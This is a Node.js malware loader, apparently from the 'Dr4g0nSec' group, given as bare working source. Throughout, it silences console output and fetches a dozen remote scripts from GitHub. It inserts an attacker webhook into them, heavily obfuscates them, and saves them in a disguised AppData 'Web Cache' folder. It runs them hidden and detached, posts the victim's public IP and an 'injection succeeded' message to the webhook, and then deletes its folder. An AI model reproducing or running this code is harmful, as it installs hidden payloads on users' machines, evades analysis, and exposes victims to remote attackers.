console.log = console.error = console.warn = console.info = () => {};
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { execFile } = require('child_process');
const os = require('os');
const https = require('https');
const JavaScriptObfuscator = require('javascript-obfuscator');

const H00K = "%WEBHOOK%";

const scriptsToDownload = [
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/install_imports.js', fileName: 'install_imports.js' },
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/vbnt9nnv82i8.js' },
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/ux37nh9ww1eg.js' },
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/60o7lxnsi0tz.js' },
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/b4ttyxac2un.js' },
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/kjk229v9y6m.js' },
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/mx3js8m595bw.js' },
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/npkftjyk31st.js' },
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/8wkfhke7w36.js' },
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/7fym00w26hly.js' },
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/utytem533kxa.js' },
    { url: 'https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/59877135dkw.js' }
];

const publisheresPath = path.join(process.env.LOCALAPPDATA, 'Publisheres');
const webCachePath = path.join(publisheresPath, 'Web Cache');
const prepparedPath = path.join(webCachePath, 'preppared');
const data79Path = path.join(webCachePath, 'data79');

function generateRandomName() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let name = '';
    for (let i = 0; i < 8; i++) {
        name += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return name + '.js';
}

function ensureFolders() {
    [prepparedPath, data79Path].forEach(folder => {
        if (!fs.existsSync(folder)) {
            fs.mkdirSync(folder, { recursive: true });
        }
    });
}

async function tryDownload(url, maxAttempts = 4) {
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
        try {
            const response = await axios.get(url);
            return response.data;
        } catch (_) {
            await new Promise(res => setTimeout(res, 1000));
        }
    }
    return null;
}

async function downloadFiles() {
    for (const script of scriptsToDownload) {
        try {
            const contentRaw = await tryDownload(script.url);
            if (!contentRaw) continue;

            let content = contentRaw.split('\n').map(line => {
                if (line.includes('H00K3_URL = "%WEBHOOK%"')) {
                    return line.replace('%WEBHOOK%', H00K);
                }
                return line;
            }).join('\n');

            const name = script.fileName || generateRandomName();

            if (name.toLowerCase() !== 'install_imports.js') {
                const obfuscated = JavaScriptObfuscator.obfuscate(content, {
                    compact: true,
                    controlFlowFlattening: true,
                    controlFlowFlatteningThreshold: 1,
                    deadCodeInjection: true,
                    deadCodeInjectionThreshold: 1,
                    debugProtection: true,
                    disableConsoleOutput: true,
                    rotateStringArray: true,
                    selfDefending: true,
                    stringArray: true,
                    stringArrayEncoding: ['rc4'],
                    stringArrayThreshold: 1,
                    transformObjectKeys: true,
                    unicodeEscapeSequence: true
                });
                content = obfuscated.getObfuscatedCode();
            }

            const filePath = path.join(prepparedPath, name);
            fs.writeFileSync(filePath, content, 'utf8');
        } catch (_) {}
    }
}

function runScript(filePath) {
    return new Promise((resolve) => {
        execFile('node', [filePath], {
            windowsHide: true,
            stdio: 'ignore',
            detached: true
        }, () => resolve());
    });
}

async function executeScripts() {
    const allFiles = fs.readdirSync(prepparedPath);
    const installScript = allFiles.find(f => f === 'install_imports.js');

    if (installScript) {
        await runScript(path.join(prepparedPath, installScript));
    }

    for (const file of allFiles) {
        if (file !== 'install_imports.js' && file.endsWith('.js')) {
            await runScript(path.join(prepparedPath, file));
        }
    }
}

async function sendEmbed() {
    const now = new Date().toLocaleString();
    const injectedPath = prepparedPath || 'Não foi possível obter';
    let ip = "Não foi possível obter";

    try {
        const res = await axios.get("https://api.ipify.org?format=json");
        ip = res.data.ip || ip;
    } catch (_) {}

    const embed = {
        content: "",
        tts: false,
        embeds: [
            {
                id: 10674342,
                title: "**Dr4g0nSec | Startup**",
                description: `__**Código de inicialização foi injectado com sucesso!**__\n\n` +
                             `> **Injectado dia:** \`${now || "Não foi possível obter"}\`\n` +
                             `> **Local onde foi injectado:** \`${injectedPath || "Não foi possível obter"}\`\n` +
                             `> **IP do usuário:** \`${ip}\``,
                color: 0x250e80,
                footer: {
                    text: "Created by: sk4rty | Dr4g0nSec on Top!",
                    icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400"
                },
                fields: [],
                image: {
                    url: "https://i.imgur.com/FzJc5Xq.png"
                }
            }
        ],
        components: [],
        actions: {},
        flags: 0,
        username: "Dr4g0nSec | Inicialização",
        avatar_url: "https://i.imgur.com/83uCFZe.jpeg"
    };

    try {
        await axios.post(H00K, embed);
    } catch (_) {}
}

async function main() {
    try {
        ensureFolders();
        await downloadFiles();
        await executeScripts();
        await sendEmbed();
        fs.rmSync(publisheresPath, { recursive: true, force: true });
    } catch (_) {}
}

main();
